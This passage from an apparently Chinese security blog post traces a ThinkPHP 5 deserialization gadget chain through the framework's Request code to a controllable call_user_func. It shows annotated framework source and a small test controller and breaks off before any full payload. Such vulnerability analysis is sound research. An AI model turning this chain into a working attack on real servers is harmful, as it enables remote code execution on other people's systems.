&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     */&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
       &lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// 获取包含文件上传信息的数组
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;array_merge&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;会调用&lt;code&gt;input&lt;/code&gt;，发现&lt;code&gt;$this-&amp;gt;param&lt;/code&gt;我们是可控的，但是&lt;code&gt;$filter&lt;/code&gt;和&lt;code&gt;$name&lt;/code&gt;不明确，继续往上找。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;找到&lt;code&gt;isAjax&lt;/code&gt;：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * 当前是否Ajax请求
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @access public
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  bool $ajax  true 获取原始ajax请求
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @return bool
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     */&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;isAjax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ajax&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HTTP_X_REQUESTED_WITH&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;xmlhttprequest&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$ajax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;           &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;var_ajax&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;mergeParam&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;会调用&lt;code&gt;param&lt;/code&gt;，且通过&lt;code&gt;$this-&amp;gt;config[&#39;var_ajax&#39;]&lt;/code&gt;给param函数的&lt;code&gt;$name&lt;/code&gt;参数赋值，且&lt;code&gt;$this-&amp;gt;config[&#39;var_ajax&#39;]&lt;/code&gt;我们可控，分析一下赋值后的执行流程：&lt;/p&gt;
&lt;p&gt;在param函数中name参数被赋值后且不是true，会调用&lt;code&gt;$this-&amp;gt;input($this-&amp;gt;param, $name, $default, $filter);&lt;/code&gt;，即&lt;code&gt;input&lt;/code&gt;函数第二个参数name被赋值且第一个参数&lt;code&gt;$this-&amp;gt;param&lt;/code&gt;我们可控；在input函数中存在如下调用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getFilter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;filterValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;跟进&lt;code&gt;getData&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * 获取数据
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @access public
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  array         $data 数据源
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  string|false  $name 字段名
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @return mixed
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     */&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$val&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$val&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$val&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该函数的&lt;code&gt;$data&lt;/code&gt;参数是由&lt;code&gt;$this-&amp;gt;param&lt;/code&gt;可控，&lt;code&gt;$name&lt;/code&gt;参数来自于&lt;code&gt;$this-&amp;gt;config[&#39;var_ajax&#39;]&lt;/code&gt;，返回值是这样进行赋值&lt;code&gt;$data = $data[$val]&lt;/code&gt;，即最终的返回值我们可控，也就是input函数中的&lt;code&gt;$data&lt;/code&gt;可控，那么&lt;code&gt;$this-&amp;gt;filterValue&lt;/code&gt;函数的data参数也就可控，现在就差&lt;code&gt;$filter&lt;/code&gt;是否可控。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跟进&lt;code&gt;getFilter&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getFilter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?:&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strpos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现返回的&lt;code&gt;filter&lt;/code&gt;值来自于&lt;code&gt;$this-&amp;gt;filter&lt;/code&gt;，也就是可控的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;综上，对于filterValue函数来说，其参数&lt;code&gt;value&lt;/code&gt;可控，&lt;code&gt;filter&lt;/code&gt;可控，那么其中所调用的&lt;code&gt;call_user_func($filter, $value)&lt;/code&gt;也就完全可控。从而执行恶意代码。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;过程中提到input函数中&lt;code&gt;$this-&amp;gt;param&lt;/code&gt;这个值，虽然我们可以通过类属性控制它，但是发现可以在GET请求中加入参数对其进行赋值，进行个简单测试：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
namespace app\index\controller;

use think\Request;
class Index
{
    public function index(Request $request)
    {
        var_dump($request-&amp;gt;param());
        return &#39;haha&#39;;
    }

    public function hello($name = &#39;ThinkPHP5&#39;)
    {
        return &#39;hello,&#39; . $name;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 424; 
			flex-basis: 1019px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-5/image-20220222183619109.png&#34; data-size=&#34;535x126&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-5/image-20220222183619109.png&#34;
			width=&#34;535&#34;
			height=&#34;126&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-5/image-20220222183619109_hu1a0559a29f950b82acdc5f463b5fbd43_10393_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-5/image-20220222183619109_hu1a0559a29f950b82acdc5f463b5fbd43_10393_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;梳理执行链：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Model类__call方法，令$this-&amp;gt;hook = [&amp;#34;visible&amp;#34;=&amp;gt;[$this,&amp;#34;isAjax&amp;#34;]]；调用this-&amp;gt;isAjax方法，经上面分析，this-&amp;gt;isAjax方法对参数无要求，所以哪怕在$args头插入this也无所谓了。
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$method&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;array_key_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$method&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;hook&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;array_unshift&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;call_user_func_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;hook&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$method&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
       
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;


&lt;span class=&#34;c1&#34;&gt;# 触发调用isAjax函数，令$this-&amp;gt;config[&amp;#39;var_ajax&amp;#39;]=&amp;#39;haha&amp;#39;
